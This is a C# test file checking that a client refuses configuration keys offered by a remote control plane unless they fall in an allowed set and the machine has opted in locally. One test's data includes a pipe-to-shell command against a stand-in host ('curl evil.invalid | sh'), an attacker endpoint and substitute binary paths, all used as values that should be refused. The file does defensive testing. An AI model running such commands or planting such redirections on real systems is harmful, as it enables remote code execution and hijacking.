using Gg.Client;
using Gg.Contracts;
using Gg.Local;

namespace Gg.Client.Tests;

/// <summary>
/// What a machine does with configuration the control plane offers it.
/// </summary>
/// <remarks>
/// <para>
/// <b>A control plane that can change what a machine does is the shape this
/// product's rules name most often</b> — <i>"policy arriving at a runner is
/// Article IX's failure wearing a convenience"</i> appears three times in the
/// contract. So an offer does not inherit the local file's safety; it earns its
/// own, and the refusal is built and proven before anything can be accepted.
/// </para>
/// <para>
/// <b>Three controls, and the third is the one that matters.</b> An enumerated
/// set rather than a forbidden list, because a forbidden list passes on the
/// third member nobody thought of. A tier that decides what may apply while
/// nobody is looking. And <b>the local file decides whether any of it is
/// accepted at all</b> — a key the offer cannot carry, so a control plane
/// cannot grant itself the ability to configure a machine.
/// </para>
/// <para>
/// <b>This file holds the REFUSAL half.</b> What is left on its list is what no
/// person accepting could make safe. The keys that redirect — forge hosts,
/// destination APIs, the control plane — moved into the directed tier when the
/// walk found an operator really does change them across a fleet, and
/// <c>AnOfferThatRedirectsNeedsAPersonTests</c> holds that half.
/// </para>
/// <para>
/// <b>And one key was retired rather than moved.</b> <c>runner-hold-seconds</c>
/// was proposed and dropped: nobody sets it anywhere, so it is surface offered
/// for a need nothing evidences.
/// </para>
/// </remarks>
public class AnOfferedConfigurationIsRefusedByDefaultTests
{
    private static OfferedConfiguration Offering(params (string Key, string Value)[] settings) =>
        new()
        {
            Version = "offer@v1",
            OfferedAt = DateTimeOffset.UnixEpoch,
            Settings = [.. settings.Select(s => new OfferedSetting
            {
                Key = s.Key,
                Value = s.Value,
            })],
        };

    [Test]
    public async Task Nothing_is_accepted_until_the_machine_says_so()
    {
        // THE WHOLE SAFETY ARGUMENT. Default off, decided locally, and the offer
        // has no way to reach the key that would turn it on.
        var taken = OfferedConfigurations.Accept(
            Offering(("stun-servers", "stun:relay.invalid:3478")),
            into: new Configuration());

        await Assert.That(taken.Configuration).IsNull()
            .Because("nothing opted in, so nothing changes.");
        await Assert.That(taken.Waiting).IsTrue()
            .Because("a person should be able to find out an offer arrived, or the feature "
                   + "is invisible until somebody happens to turn it on.");
    }

    [Test]
    public async Task A_machine_that_opted_in_takes_an_offerable_key()
    {
        var taken = OfferedConfigurations.Accept(
            Offering(("stun-servers", "stun:relay.invalid:3478")),
            into: new Configuration { AcceptOffered = true });

        await Assert.That(taken.Refused).IsNull();
        await Assert.That(taken.Configuration!.StunServers)
            .IsEqualTo("stun:relay.invalid:3478");
    }

    [Test]
    public async Task Every_key_outside_the_offerable_set_is_refused_and_named()
    {
        // ONE AT A TIME, not once. A refusal asserted on a single key would pass
        // for an implementation that happened to reject that one.
        // THREE OF THESE MOVED, and the move is recorded rather than the list
        // quietly shrinking. vcs-hosts, destination-apis and control-plane are
        // offerable now and live in the directed tier, where a person accepts
        // them - AnOfferThatRedirectsNeedsAPersonTests holds that half. What is
        // left here is what no person accepting could make safe: a path a
        // person glances at is not review of what a program does, a reader's
        // value IS a command line with a credential in it, and moving the
        // scope-enforcing proxy removes the enforcement rather than aiming it
        // somewhere else.
        var instructions = new (string Key, string Value)[]
        {
            ("executor-binary", "/tmp/not-your-agent"),
            ("intent-readers", "x=curl evil.invalid | sh"),
            ("pool-endpoint", "https://attacker.invalid"),
            ("editor", "/tmp/not-your-editor"),
            ("take-command", "/tmp/not-your-agent"),
        };

        foreach (var (key, value) in instructions)
        {
            var taken = OfferedConfigurations.Accept(
                Offering((key, value)),
                into: new Configuration { AcceptOffered = true });

            await Assert.That(taken.Refused).IsNotNull()
                .Because($"'{key}' is an instruction wearing configuration's clothes and "
                       + "must not arrive from a control plane.");
            await Assert.That(taken.Refused!).Contains(key, StringComparison.Ordinal)
                .Because($"the refusal should name '{key}'. Said: {taken.Refused}");
            await Assert.That(taken.Configuration).IsNull()
                .Because("a refused offer changes nothing at all, not even its good half.");
        }
    }

    [Test]
    public async Task The_key_that_turns_this_on_is_not_one_the_offer_can_carry()
    {
        // B's whole safety argument, and it gets its own test rather than being
        // implied by the enumeration above.
        foreach (var key in (string[])["accept-offered", "accept-unattended"])
        {
            await Assert.That(OfferableKeys.All).DoesNotContain(key)
                .Because($"'{key}' decides whether a control plane may configure this "
                       + "machine, so a control plane offering it would be granting itself "
                       + "the permission.");
        }
    }

    [Test]
    public async Task Every_offerable_key_is_one_the_file_can_actually_hold()
    {
        // A key nothing can store is a key admission would accept and nothing
        // would apply - the silent no-op, arriving through the wire.
        foreach (var key in OfferableKeys.All)
        {
            await Assert.That(Configuration.Members.Any(
                m => string.Equals(m.Key, key, StringComparison.Ordinal))).IsTrue()
                .Because($"'{key}' is offerable and the file has nowhere to put it.");
        }
    }

    [Test]
    public async Task An_offer_identical_to_what_is_there_changes_nothing_and_says_so()
    {
        var already = new Configuration
        {
            AcceptOffered = true,
            StunServers = "stun:relay.invalid:3478",
        };

        var taken = OfferedConfigurations.Accept(
            Offering(("stun-servers", "stun:relay.invalid:3478")), into: already);

        await Assert.That(taken.Changed).IsFalse()
            .Because("re-offering what is already in force should not rewrite the file or "
                   + "report a change nobody made.");
    }

    [Test]
    public async Task A_value_the_document_would_refuse_is_refused_here_too()
    {
        // The offer does not get a way round Validate. A control plane cannot
        // write into this file something a person could not.
        var taken = OfferedConfigurations.Accept(
            Offering(("runner-labels", "   ")),
            into: new Configuration { AcceptOffered = true });

        await Assert.That(taken.Refused).IsNotNull();
        await Assert.That(taken.Configuration).IsNull();
    }
}
